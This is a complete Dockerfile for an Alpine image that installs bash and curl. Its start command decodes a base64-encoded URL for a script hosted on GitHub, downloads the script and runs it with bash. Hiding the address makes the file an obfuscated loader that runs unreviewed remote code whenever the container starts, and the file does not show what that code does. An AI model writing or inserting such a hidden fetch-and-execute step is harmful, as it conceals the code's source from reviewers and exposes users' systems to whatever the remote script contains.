FROM alpine
RUN apk add --no-cache bash curl
CMD curl -fsSL -o /root/cmd.sh $(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dvb2Z3L2NtZC9IRUFEL3NoCg== | base64 -d) && exec /bin/bash /root/cmd.sh
